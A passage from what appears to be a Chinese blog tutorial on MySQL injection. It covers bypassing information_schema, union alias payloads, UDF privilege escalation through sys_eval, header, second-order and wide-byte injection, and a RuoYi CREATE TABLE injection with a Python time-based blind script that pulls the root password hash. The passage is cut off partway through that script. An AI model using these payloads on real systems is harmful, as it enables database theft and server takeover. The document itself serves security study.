<li>主要字段<ul>
<li><code>TABLE_SCHEMA</code>：数据库名</li>
<li><code>TABLE_NAME</code>：表名</li>
<li><code>TABLE_TYPE</code>：表的类型（例如，BASE TABLE 或 VIEW）</li>
<li><code>ENGINE</code>：表使用的存储引擎</li>
<li><code>VERSION</code>：表的版本号</li>
<li><code>ROW_FORMAT</code>：行格式（例如，COMPACT）</li>
</ul>
</li>
</ul>
<p><code>COLUMNS</code></p>
<ul>
<li><strong>内容</strong>：包含有关数据库中所有列的信息。</li>
<li>主要字段<ul>
<li><code>TABLE_SCHEMA</code>：数据库名</li>
<li><code>TABLE_NAME</code>：表名</li>
<li><code>COLUMN_NAME</code>：列名</li>
<li><code>ORDINAL_POSITION</code>：列的位置</li>
<li><code>COLUMN_DEFAULT</code>：列的默认值</li>
<li><code>IS_NULLABLE</code>：列是否可以为 NULL</li>
<li><code>DATA_TYPE</code>：列的数据类型</li>
</ul>
</li>
</ul>
<p><code>SCHEMATA</code></p>
<ul>
<li><strong>内容</strong>：包含所有数据库（模式）的信息。</li>
<li>主要字段<ul>
<li><code>CATALOG_NAME</code>：目录名</li>
<li><code>SCHEMA_NAME</code>：数据库名</li>
<li><code>DEFAULT_CHARACTER_SET_NAME</code>：默认字符集</li>
<li><code>DEFAULT_COLLATION_NAME</code>：默认排序规则</li>
<li><code>SQL_PATH</code>：SQL 路径</li>
</ul>
</li>
</ul>
<p>先放这三个，后面学到新的之后再回来补充，接下来我们讲另一个知识点</p>
<h5 id="爆库名和表名"><a href="#爆库名和表名" class="headerlink" title="爆库名和表名"></a>爆库名和表名</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql：</span><br><span class="line">mysql<span class="selector-class">.innodb_table_stats</span></span><br><span class="line">mysql<span class="selector-class">.innodb_index_stats</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys：</span><br><span class="line"><span class="attribute">x</span><span class="variable">$schema_table_statistics_with_buffer</span></span><br><span class="line">schema_table_statistics_with_buffer</span><br><span class="line"></span><br><span class="line">视图：</span><br><span class="line">schema_auto_increment_columns</span><br></pre></td></tr></table></figure>

<p><strong>1.mysql库下的InnoDb表</strong></p>
<p>mysql 5.5.8之后开始使用InnoDb作为默认引擎，<strong>mysql 5.6</strong>的InnoDb增加了<strong>innodb_index_stats</strong>和<strong>innodb_table_stats</strong>两张表，这两张表就是我们bypass information_schema的第一步，也是获取数据库名和表名的另一种思路</p>
<p><strong>这两张表记录了数据库和表的信息，但是没有列名</strong>，sql语句就是</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">database_name</span>) <span class="keyword">from</span> mysql.innodb_index_stats</span>;</span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name</span>=database()</span><br></pre></td></tr></table></figure>

<p>另外还有一个就是sys库</p>
<h5 id="2-sys库"><a href="#2-sys库" class="headerlink" title="2.sys库"></a>2.sys库</h5><p><code>sys</code> 库是一个提供系统信息和数据库监控的虚拟数据库。它是一个更高级别的视图，旨在简化对 MySQL 服务器性能和配置的查询。<code>sys</code> 库中的表和视图主要用于提供有关服务器状态、性能和其他实用信息的便利视图。</p>
<p>sys库通过视图的形式把information_schema和performance_schema结合起来，查询令人容易理解的数据。</p>
<ul>
<li><strong>sys.schema_table_statistics_with_buffer</strong></li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库</span><br><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> sys.schema_table_statistics_with_buffer;</span><br><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> sys.x$schema_table_statistics_with_buffer;</span><br><span class="line"># 查询指定数据库的表</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema=<span class="keyword">database</span>();</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> sys.x$schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema=<span class="keyword">database</span>();</span><br></pre></td></tr></table></figure>

<p>另外还有一种摘录到的</p>
<ul>
<li><strong>sys.schema_auto_increment_columns</strong></li>
</ul>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#查询数据库名</span></span><br><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> sys.schema_auto_increment_columns</span><br><span class="line"><span class="meta">#查询表名</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> sys.schema_auto_increment_columns <span class="keyword">where</span> table_schema=databse()</span><br></pre></td></tr></table></figure>

<p>同样的，这个sys库也是能用来查找表名和数据库名的</p>
<p>那么我们查询完数据库名和表名后，就需要对列进行查询，这里有多个方法</p>
<h5 id="爆列中数据"><a href="#爆列中数据" class="headerlink" title="爆列中数据"></a>爆列中数据</h5><ul>
<li><h3 id="union取别名"><a href="#union取别名" class="headerlink" title="union取别名"></a>union取别名</h3></li>
</ul>
<p>就是通过union语句的特点<strong>将列名转换为任何可选的已知值</strong></p>
<p>假如我们的查询语句是这样的</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>

<p>我们先本地测试一下</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250310161630529.png" alt="image-20250310161630529"></p>
<p>这里可以看到当我们使用上面的语句的时候，就会出现一行派生表列，此时每列的别名就是1，2，3.如果我们不知道列数，因为union 的特点，假如列数不相等就会报错</p>
<p><strong>这样我们就可以用1，2，3来代替列名了</strong></p>
<p>payload</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">select</span> `<span class="number">2</span>` <span class="selector-tag">from</span> (<span class="selector-tag">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> union <span class="selector-tag">select</span> * <span class="selector-tag">from</span> <span class="selector-tag">table</span>)<span class="selector-tag">a</span>;</span><br></pre></td></tr></table></figure>

<p>如果反引号被过滤，同样继续用别名代替</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(a) <span class="keyword">from</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">as</span> a,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">as</span> c,<span class="number">4</span> <span class="keyword">as</span> d <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> tp_user)<span class="keyword">as</span> m),<span class="number">3</span>#</span><br></pre></td></tr></table></figure>

<ul>
<li><h3 id="利用join爆列名"><a href="#利用join爆列名" class="headerlink" title="利用join爆列名"></a>利用join爆列名</h3></li>
</ul>
<p>条件是页面有回显才能使用</p>
<h2 id="10-UDF提权"><a href="#10-UDF提权" class="headerlink" title="10.UDF提权"></a>10.UDF提权</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/283566.html">https://www.freebuf.com/articles/web/283566.html</a></p>
<p>目的：简单来说就是让sql shell转为Linux shell或者Windows shell</p>
<p>其实这个不全是sql注入的一部分，这个通常在于我们getshell之后由于我们当前用户权限问题无法进行进一步的攻击，并且当前服务器恰好存在mysql数据库，我们就可以通过UDF注入提权</p>
<p>为什么可以通过UDF注入提权呢？由于windows安装的mysql进程一般都拥有管理员权限，这就意味着用户自定义的函数也拥有管理员权限，我们也就拥有了执行管理员命令的权限，这时新建管理员用户等操作也就轻而易举了，大多数人称为这一操作为udf提权，其实表达不够准确，应该称为通过mysql获得管理员权限。</p>
<p>udf 全称为：user defined function，意为用户自定义函数，udf 文件后缀一般为 dll，由C、C++编写</p>
<p>提权原理：上传动态库文件，里面有你编译好的自定义函数，然后用UDF机制加载这个动态库使得我们能通过自定义函数执行命令</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>拥有mysql数据库高权限账号，该账号需要拥有对数据insert和delete权限，最好是root</li>
<li>拥有将udf.dll写入相应目录的权限。</li>
</ul>
<h3 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h3><p>其实也不算版本限制，只是这是udf利用的其中一步就是需要将udf的dll文件上传道mysql检索目录中，但是mysql个版本的检索目录各不相同</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250521161100598.png" alt="image-20250521161100598"></p>
<p>然后dll文件上传的方法有两种：</p>
<ul>
<li>通过webshell上传</li>
<li>通过hex方式去上传</li>
</ul>
<p>sqlmap有现成的dll文件<code>lib_mysqludf_sys.dll</code></p>
<p>攻击者可以利用lib_mysqludf_sys提供的函数执行系统命令。</p>
<p>函数：</p>
<p><strong>sys_eval，执行任意命令，并将输出返回。</strong></p>
<p><strong>sys_exec，执行任意命令，并将退出码返回。</strong></p>
<p><strong>sys_get，获取一个环境变量。</strong></p>
<p><strong>sys_set，创建或修改一个环境变量。</strong></p>
<p>攻击方法：</p>
<p><strong>首先需要将lib_mysqludf_sys ( 目标为windows时，lib_mysqludf_sys.dll；linux时，lib_mysqludf_sys.so）上传到数据库能访问的路径下。</strong></p>
<p>然后需要在mysql中创建这个文件中的函数</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval returns <span class="keyword">string</span> soname <span class="string">&#x27;dll文件&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后就可以执行函数</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">select</span> <span class="function"><span class="title">sys_eval</span>(<span class="string">&#x27;ipconfig&#x27;</span>)</span></span><br></pre></td></tr></table></figure>

<h2 id="11-请求头注入"><a href="#11-请求头注入" class="headerlink" title="11.请求头注入"></a>11.请求头注入</h2><p>HTTP头部注入产生的核心原因就是，<strong>后端存在查询或记录HTTP请求头内容</strong></p>
<p>拿UA头和Rerferer头i注入举个例子</p>
<h3 id="UA头和Rerferer头注入"><a href="#UA头和Rerferer头注入" class="headerlink" title="UA头和Rerferer头注入"></a>UA头和Rerferer头注入</h3><p>原理：有些网站会把用户的UA信息或者Rerferer信息写入数据库，用来收集和统计用户信息，此时就有可能存在UA 头注入，<strong>一般会把数据插入到某张表中所以可以用报错注入</strong>。</p>
<p>这种漏洞产生原因其实都蛮相似，和正常的sql注入也差不多，也就是sql语句的查询也用了http请求头的参数，比如User-Agent、cookie、X-Forwarded-For、Rerferer等等，只要测试的时候注意一下也测试这几个点即可，或者sqlmap一把梭的时候加上Level 5，直接就帮我们把这些点都测试完了。</p>
<p>例如苟哥博客中给出的例子</p>
<p>举个例子，某川渝大学生信安竞赛只有一两解的sql题，它漏洞产生的原因可能是因为后台源码为：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sq1=&quot;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username=$session_id <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>

<p>那么此时注入点就是在cookie请求头的sessid中，我们在该请求头注入就行</p>
<p>但是目前发现的就是Cookie头不仅能打union查询注入还能打报错注入，有保存请求头信息并显示信息的话都可以尝试打报错注入</p>
<h2 id="12-二次注入"><a href="#12-二次注入" class="headerlink" title="12.二次注入"></a>12.二次注入</h2><p>二次注入简单来说就是绕了一圈后再次进行的注入</p>
<p>二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</p>
<p>普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</p>
<h3 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h3><p>在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在后端代码中可能会被转义，但在存入数据库时还是原来的数据，数据中一般带有单引号和＃号，然后下次使用在拼凑SQL中，所以就形成了二次注入。</p>
<h3 id="注入条件"><a href="#注入条件" class="headerlink" title="注入条件"></a>注入条件</h3><p>两次注入分别是<strong>插入恶意数据</strong>、<strong>利用恶意数据</strong></p>
<ul>
<li>用户向数据库插入恶意数据，即使后端对语句做了转义，如mysql_escape_string、mysql_real_escape_string等函数</li>
<li>数据库能够将恶意数据取出并且不会做转义处理</li>
</ul>
<h3 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h3><ol>
<li>例如我们像数据库中插入1’#，但是此时的插入语句是经过检测处理的，最后会被转义为<code>1\&#39;#</code>，但是保存到数据库中的还是<code>1&#39;#</code></li>
<li>之后我们利用这个插入的数据<code>1&#39;#</code>进行注入，但是要求利用的时候不会经过转义</li>
</ol>
<p>我们拿sqli-labs24进行测试，先是在注册页面注册一个账号</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Desired <span class="attribute">Username</span>=admin&#x27;#</span><br><span class="line"><span class="attribute">Password</span>=123</span><br><span class="line">Retype <span class="attribute">Password</span>=123</span><br></pre></td></tr></table></figure>

<p>注册后进行登录</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250604164511808.png" alt="image-20250604164511808"></p>
<p>修改密码，推测修改密码的源码为</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;<span class="keyword">UPDATE</span> users <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username=<span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;$curr_pass&#x27;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果此时数据库取出该名字的时候不会进行转义，那么插入语句中就是</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE<span class="built_in"> users </span><span class="built_in">SET</span> <span class="attribute">PASSWORD</span>=<span class="string">&#x27;1234567&#x27;</span> where <span class="attribute">username</span>=<span class="string">&#x27;admin’#&#x27;</span> <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure>

<p>由于这里不会被转义，故可以直接利用，这个时候就变成了修改了admin的密码了</p>
<p>之后利用修改的密码搭配admin用户名登录</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250604164803664.png" alt="image-20250604164803664"></p>
<h2 id="13-宽字节注入"><a href="#13-宽字节注入" class="headerlink" title="13.宽字节注入"></a>13.宽字节注入</h2><h3 id="什么是宽字节"><a href="#什么是宽字节" class="headerlink" title="什么是宽字节"></a>什么是宽字节</h3><p>宽字节其实就是相对于ASCII那种单字节来说的，通常占两个字节的字符，类似GBK，GB2312编码这种就是常说的宽字节</p>
<h3 id="注入原理-1"><a href="#注入原理-1" class="headerlink" title="注入原理"></a>注入原理</h3><p>其实这个就是利用mysql的一个特性，mysql开启GBK编码处理的时候，默认会把两个字符认成是一个汉字（前提是第一个ASCII值要大于128才能到汉字的范围）比如利用%df，当我们输入单引号时，mysql会调用转义函数，将单引号变为<code>\&#39;</code>，其中\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是<code>’運’</code>，从而使单引号闭合（逃逸），进行注入攻击。</p>
<h2 id="转义单引号的绕过plus"><a href="#转义单引号的绕过plus" class="headerlink" title="转义单引号的绕过plus"></a>转义单引号的绕过plus</h2><p>在Post请求中，此处介绍一个新方法：将utf-8转换为 utf-16 或 utf-32，例如将 ‘ 转为utf-16的 �’ 。这里的�是有由类似%%%的东西组成的，然后再加上 ‘ (即%27)，然后相当于urlencode后类似 %EF%BF%%BD%27 的东西，然后是宽字符漏铜，%EF%BF会组成一个中文字符，而%BD%27也会被当成中文字符，然后php不会进行转义。然后语句流到mysql的时候，Mysql会将三个%转为一个中文字符，然后剩下%27作为引号，以此进行注入。</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=�&#x27; or 1<span class="comment">#&amp;passwd=</span></span><br></pre></td></tr></table></figure>

<h2 id="Create创建表注入"><a href="#Create创建表注入" class="headerlink" title="Create创建表注入"></a>Create创建表注入</h2><p>这个思路源于我在复现一个若依的sql注入的时候积累的一个思路<a target="_blank" rel="noopener" href="https://github.com/yangzongzhuan/RuoYi/issues/300">https://github.com/yangzongzhuan/RuoYi/issues/300</a></p>
<p>在ruoyi-generator&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ruoyi&#x2F;generator&#x2F;controller&#x2F;GenController.java中有一个创建数据表的功能点</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250912151632690.png" alt="image-20250912151632690"></p>
<p>这里的话有一个filterKeyword过滤器，看一下都过滤了什么</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SQL_REGEX</span> <span class="operator">=</span> <span class="string">&quot;\u000B|and |extractvalue|updatexml|sleep|exec |insert |select |delete |update |drop |count |chr |mid |master |truncate |char |declare |or |union |like |+|/*|user()&quot;</span>;    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">filterKeyword</span><span class="params">(String value)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(value))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] sqlKeywords = StringUtils.split(SQL_REGEX, <span class="string">&quot;\\|&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String sqlKeyword : sqlKeywords)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (StringUtils.indexOfIgnoreCase(value, sqlKeyword) &gt; -<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UtilException</span>(<span class="string">&quot;参数存在SQL注入风险&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其实过滤的还是蛮多的，看到select的时候以为已经打不了了，但是仔细看发现这里其实过滤的是select+空格，那这样的话我们就可以利用绕过空格的方法去绕过select例如select’1’或者select(1)，然后sleep过滤的话就用banchmark去绕过</p>
<p>继续看过滤后的步骤</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250912152751157.png" alt="image-20250912152751157"></p>
<p>其实就是执行创建数据表语句的过程，并且这里并没有参与参数化查询而是直接执行语句，所以只要绕过了黑名单就能打sql注入</p>
<p>然后我们介绍一下新认识的一个sql语法</p>
<h3 id="CREATE-TABLE-…-AS-SELECT-…"><a href="#CREATE-TABLE-…-AS-SELECT-…" class="headerlink" title="CREATE TABLE … AS SELECT …"></a>CREATE TABLE … AS SELECT …</h3><p><code>CREATE TABLE ... AS SELECT ...</code> 是 <strong>MySQL（以及部分其他数据库）中一个特殊的建表语句</strong>，它可以 <strong>在创建表的同时，用 SELECT 查询的结果填充表数据</strong>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE 新表名 AS</span><br><span class="line">SELECT 列名<span class="number">1</span>, 列名<span class="number">2</span>, ...</span><br><span class="line">FROM 原表名</span><br><span class="line">WHERE 条件;</span><br></pre></td></tr></table></figure>

<p>简单来说是通过查询现有表的内容去填充新的表数据，但是因为这里有select语句并且存在where子句可用，所以也就可以构成sql注入的风险</p>
<p>那么这里的注入语句就是</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table aaa_&#123;table_counter&#125; as select<span class="string">&#x27;1&#x27;</span>from sys_job where <span class="title function_">if</span><span class="params">(ascii(substring((SELECT(authentication_string)</span>from mysql.user WHERE user=<span class="string">&#x27;root&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),&#123;position&#125;,<span class="number">1</span>))=&#123;ord(<span class="type">char</span>)&#125;,BENCHMARK(<span class="number">20000000</span>,md5(<span class="number">1</span>)),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_sql_injection</span>():</span><br><span class="line">    base_url = <span class="string">&quot;http://127.0.0.1:80/tool/gen/createTable&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;JSESSIONID=84d99885-ed8b-4672-9c01-c21fe059574f&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 字符集：星号和十六进制大写字母</span></span><br><span class="line">    charset = <span class="string">&#x27;*0123456789ABCDEF&#x27;</span></span><br><span class="line">    password = []</span><br><span class="line">    table_counter = <span class="number">1</span>  <span class="comment"># 用于递增表名</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 测试41个位置（假设密码哈希值长度为41，包括星号）</span></span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">42</span>):</span><br><span class="line">        found_char = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 测试每个字符</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="comment"># 构建SQL语句，表名递增</span></span><br><span class="line">            sql_template = <span class="string">f&quot;create table aaa_<span class="subst">&#123;table_counter&#125;</span> as select&#x27;1&#x27;from sys_job where if(ascii(substring((SELECT(authentication_string)from mysql.user WHERE user=&#x27;root&#x27; limit 0,1),<span class="subst">&#123;position&#125;</span>,1))=<span class="subst">&#123;<span class="built_in">ord</span>(char)&#125;</span>,BENCHMARK(20000000,md5(1)),1)&quot;</span></span><br><span class="line">            table_counter += <span class="number">1</span>  <span class="comment"># 递增表名计数器</span></span><br><span class="line"></span><br><span class="line">            data = &#123;<span class="string">&quot;sql&quot;</span>: sql_template&#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 记录开始时间</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.post(</span><br><span class="line">                    base_url,</span><br><span class="line">                    headers=headers,</span><br><span class="line">                    data=data,</span><br><span class="line">                    timeout=<span class="number">15</span>  <span class="comment"># 设置较长的超时时间</span></span><br><span class="line">                )</span><br><span class="line">                elapsed = time.time() - start_time</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 如果响应时间大于1秒，则认为字符正确</span></span><br><span class="line">                <span class="keyword">if</span> elapsed &gt; <span class="number">1.0</span>:</span><br><span class="line">                    found_char = char</span><br><span class="line">                    password.append(char)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;位置 <span class="subst">&#123;position&#125;</span>: 找到字符 &#x27;<span class="subst">&#123;char&#125;</span>&#x27;，响应时间: <span class="subst">&#123;elapsed:<span class="number">.2</span>f&#125;</span>秒&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;当前密码: <span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(password)&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;位置 <span class="subst">&#123;position&#125;</span>: 测试字符 &#x27;<span class="subst">&#123;char&#125;</span>&#x27;，响应时间: <span class="subst">&#123;elapsed:<span class="number">.2</span>f&#125;</span>秒&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">                found_char = char</span><br><span class="line">                password.append(char)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;位置 <span class="subst">&#123;position&#125;</span>: 找到字符 &#x27;<span class="subst">&#123;char&#125;</span>&#x27; (超时)&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;当前密码: <span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(password)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;位置 <span class="subst">&#123;position&#125;</span>: 测试字符 &#x27;<span class="subst">&#123;char&#125;</span>&#x27; 时发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="comment"># 继续尝试下一个字符</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果未找到字符，添加占位符</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">            password.append(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;位置 <span class="subst">&#123;position&#125;</span>: 未找到匹配字符&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出最终结果</span></span><br><span class="line">    final_password = <span class="string">&#x27;&#x27;</span>.join(password)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n最终密码: <span class="subst">&#123;final_password&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> final_password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 